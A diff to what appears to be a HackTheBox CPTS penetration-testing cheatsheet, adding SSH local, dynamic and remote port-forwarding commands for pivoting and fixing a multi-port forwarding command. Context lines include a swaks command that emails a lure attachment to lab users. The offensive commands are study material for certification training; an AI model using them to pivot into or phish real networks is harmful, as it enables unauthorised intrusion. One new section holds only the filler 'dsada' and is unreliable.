@@ -53,8 +53,10 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Attacking DNS Services](#attacking-dns-services)
     - [Attacking Email Services](#attacking-email-services)
 - [Pivoting, Tunneling, and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
-    - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
+    - [Local Port Forwarding with SSH](#Local-Port-Forwarding-with-SSH)
+    - [Dynamic Local Port Forwarding with SSH and SOCKS Tunneling](#dynamic-local-port-forwarding-with-ssh-and-socks-tunneling)
     - [Remote or Reverse Port Forwarding with SSH](#remote-or-reverse-port-forwarding-with-ssh)
+    - [Dynamic Remote Port Forwarding with SSH and SOCKS Tunneling](#Dynamic-Remote-Port-Forwarding-with-SSH-and-SOCKS-Tunneling)
     - [Meterpreter Tunneling and Port Forwarding](#meterpreter-tunneling-and-port-forwarding)
     - [Socat Redirection with a Reverse Shell or Bind Shell](#Socat-Redirection-with-a-Reverse-Shell-or-Bind-Shell)
     - [SSH for Windows with Plink](#SSH-for-Windows-with-plink)
@@ -1541,26 +1543,76 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 swaks --to Dave.Wizard@supermagicorg.com --from test@supermagicorg.com --server 192.168.220.199 --port 25 --auth LOGIN --auth-user "test@supermagicorg.com" --auth-password "test" --header "Subject: IT Configuration Required" --body @body.txt --attach @config.Library-ms --suppress-data 
 ```
 ## Pivoting, Tunneling, and Port Forwarding
-
-#### Dynamic Port Forwarding with SSH and SOCKS Tunneling
+#### Local Port Forwarding with SSH 
 ```
 # SSH command used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.
 ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>
 
 # Forwarding Multiple Ports
-ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>
+ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@<IPaddressofTarget>
 
+# SSH Local Port Forward 
+ssh -N -f -L  0.0.0.0:4455:172.16.67.217:445 database_admin@10.4.67.215
+ss -plunt | grep 4242
+
+-N → Do not open a shell after connecting
+Only forward the port, do not execute commands
+
+-f → Run in the background after authentication
+Release the terminal, do not occupy it
+
+-L → Local Port Forward mode
+```
+
+#### Dynamic Local Port Forwarding with SSH and SOCKS Tunneling
+```
 # SSH command used to perform a dynamic port forward on port 9050 or 1080 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.
 ssh -D 9050 ubuntu@<IPaddressofTarget>
 /etc/proxychains.conf  need have (socks4 	127.0.0.1 9050)
 or
 ssh -D 1080 ubuntu@<IPaddressofTarget>
 /etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
+
+# SSH Local Dynamic Port Forwarding
+ssh -N -D 127.0.0.1:9999 database_admin@10.4.117.215
+/etc/proxychains.conf  need have (socks5 	127.0.0.1 9999)
+ss -plunt | grep 9999
+
+-N → Do not open a shell after connecting
+Only forward the port, do not execute commands
+
+-f → Run in the background after authentication
+Release the terminal, do not occupy it
+
+-D → Local Dynamic Port Forward mode
+Create a SOCKS proxy server
+
 ```
 ##### Remote or Reverse Port Forwarding with SSH
 ```
 # SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.
 ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN
+
+# SSH Remote Port Forwarding
+ssh -N -f -R 127.0.0.1:2345:<InternalIP>:5432 sherlock-parrot@<IP-Parrot>
+ss -plunt | grep 2345    (in parrot)
+
+-N → Do not open a shell after connecting
+Only forward the port, do not execute commands
+
+-f → Run in the background after authentication
+Release the terminal, do not occupy it
+
+-R → Remote Port Forwarding
+
+```
+##### Dynamic Remote Port Forwarding with SSH and SOCKS Tunneling
+```
+dsada
+
+```
+
+
 ```
 ##### Meterpreter Tunneling and Port Forwarding
 ```
